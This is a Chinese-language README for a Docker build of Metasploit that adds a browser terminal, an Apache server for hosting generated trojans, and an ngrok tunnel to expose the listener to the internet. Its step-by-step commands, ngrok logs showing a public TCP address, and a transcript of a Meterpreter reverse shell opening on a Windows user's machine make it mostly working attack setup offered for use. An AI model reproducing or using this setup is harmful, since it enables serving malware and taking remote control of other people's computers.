# ChaoXi_Metasploit

潮汐平台的Metasploit Docker容器构建

自带apache方便生成木马下载

启动命令：

```
docker run -it --rm -p 7681:7681 -p 4444:4444 -p 80:80 metasploit tini -- ttyd -p 7681 msfconsole
```

7681为ttyd固定端口，4444端口设置为监听端口用于创建监听，80端口为apache端口

启动后打开浏览器访问本机IP地址，docker默认桥接网络，例：http://192.168.8.112:7681，即可通过浏览器进行交互。

注意：生成木马需要使用外部地址，也就是你本机的IP地址，进入msfconsle会话设置监听时设置的lhost为容器的IP地址，可以输入命令

```
cat /etc/hosts
```

启动apache只需要输入命令

```
service apache2 start
```

将木马生成到/var/www/html/下即可下载。

# 潮汐使用方法

启动后浏览器访问容器的IP地址加7681端口号，也可以是你自定义的端口号，即可通过浏览器进行交互。

在Metasploit会话中，输入命令

```
ls && ./ngrok config add-authtoken ngrok的token
```

即可配置ngrok，再输入命令

```
ls && ./ngrok --log=stdout tcp 4444 > ngrok.log &
[*] exec: ls && ./ngrok --log=stdout tcp 4444 > ngrok.log &
ngrok  ngrok-v3-stable-linux-amd64.tgz  ngrok.sh  ttyd.x86_64
```

即可映射一个4444端口的外网地址，用于生成木马

输入命令即可查看映射出去的地址
```
cat ngrok.log
[*] exec: cat ngrok.log

t=2022-06-21T12:26:14+0000 lvl=info msg="no configuration paths supplied"
t=2022-06-21T12:26:14+0000 lvl=info msg="using configuration at default config path" path=/root/.config/ngrok/ngrok.yml
t=2022-06-21T12:26:14+0000 lvl=info msg="open config file" path=/root/.config/ngrok/ngrok.yml err=nil
t=2022-06-21T12:26:14+0000 lvl=info msg="starting web service" obj=web addr=127.0.0.1:4040
t=2022-06-21T12:26:14+0000 lvl=info msg="tunnel session started" obj=tunnels.session
t=2022-06-21T12:26:14+0000 lvl=info msg="client session established" obj=csess id=bfcb9651c5ee
t=2022-06-21T12:26:15+0000 lvl=info msg="started tunnel" obj=tunnels name=command_line addr=//localhost:4444 url=tcp://0.tcp.jp.ngrok.io:10936
```

木马地址设置成外网tcp地址，端口为映射出去外网端口，metasploit设置监听主机为localhost或127.0.0.1即可，端口为4444即可。

```
exploit 

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444 
[*] Sending stage (175686 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:46862) at 2022-06-21 12:30:11 +0000

meterpreter > getuid
Server username: snowwolf-PC\snowwolf
```
